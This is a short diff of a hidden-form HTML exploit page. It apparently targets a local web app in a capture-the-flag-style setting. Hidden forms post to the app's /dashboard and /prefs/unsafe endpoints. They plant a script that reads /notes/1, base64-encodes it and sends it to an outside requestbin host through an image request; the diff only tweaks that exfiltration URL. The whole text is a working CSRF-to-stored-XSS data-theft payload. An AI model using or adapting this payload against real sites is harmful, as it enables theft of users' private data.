@@ -1,6 +1,6 @@
 <!doctype html>
 <form id=n action="http://127.0.0.1:7189/dashboard" method="post" style="display:none">
-    <input type=hidden name=content value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://requestbin.kanbanbox.com/kumilumi/?d="+encodeURIComponent(btoa(t))})</script>'>
+    <input type=hidden name=content value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://requestbin.kanbanbox.com/kumilumi?d="+encodeURIComponent(btoa(t))})</script>'>
   </form>
 
 <form id=u action="http://127.0.0.1:7189/prefs/unsafe" method="post" style="display:none">
